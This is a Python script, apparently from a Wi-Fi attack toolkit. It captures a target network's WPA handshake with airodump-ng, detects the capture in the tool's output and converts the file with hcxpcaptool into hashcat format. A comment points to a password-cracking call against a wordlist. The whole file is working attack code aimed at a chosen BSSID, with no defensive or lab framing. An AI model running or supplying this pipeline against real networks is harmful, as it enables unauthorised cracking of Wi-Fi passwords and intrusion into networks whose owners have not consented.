1   import subprocess
2   import re  # Added for detecting WPA handshake in logs

4   def capture_handshake(bssid, channel, interface="wlan0mon"):
5       """
6       Capture a WPA handshake for the given network and auto-process it.
7       :param bssid: The BSSID of the target network.
8       :param channel: The channel of the target network.
9       :param interface: The wireless interface to use (default: wlan0mon).
10      """
11      output_file = f"data/captures/handshake_{bssid}"
12      command = [
13          "airodump-ng",
14          "--bssid", bssid,
15          "--channel", str(channel),
16          "--write", output_file,
17          interface
18      ]

20      try:
21          print(f"[*] Switching to channel {channel}...")
22          subprocess.run(["iwconfig", interface, "channel", str(channel)], check=True)

24          print(f"[*] Capturing handshake for BSSID {bssid} on channel {channel}...")
25          process = subprocess.Popen(
26              command,
27              stdout=subprocess.PIPE,
28              stderr=subprocess.PIPE,
29              universal_newlines=True
30          )

32          for line in process.stdout:
33              print(line.strip())  # Log airodump-ng output
34              # Detect handshake capture in the output
35              if "WPA handshake:" in line:
36                  print("[*] Handshake successfully captured!")
37                  handshake_file = f"{output_file}-01.cap"
38                  process.terminate()  # Stop capturing once handshake is detected
39                  auto_process_handshake(handshake_file)
40                  break

42      except subprocess.CalledProcessError as e:
43          print(f"[!] Error during handshake capture: {e}")

45  def auto_process_handshake(handshake_file):
46      """
47      Automatically process a captured handshake for cracking.
48      :param handshake_file: Path to the captured handshake file.
49      """
50      print(f"[*] Processing handshake: {handshake_file}")
51      hccapx_file = handshake_file.replace(".cap", ".hccapx")
52      try:
53          subprocess.run(["hcxpcaptool", "-o", hccapx_file, handshake_file], check=True)
54          print(f"[*] Handshake converted for hashcat: {hccapx_file}")
55          # Here, you can call the cracking function
56          # Example:
57          # crack_password(hccapx_file, "data/wordlists/generated.txt")
58      except subprocess.CalledProcessError as e:
59          print(f"[!] Error during handshake processing: {e}")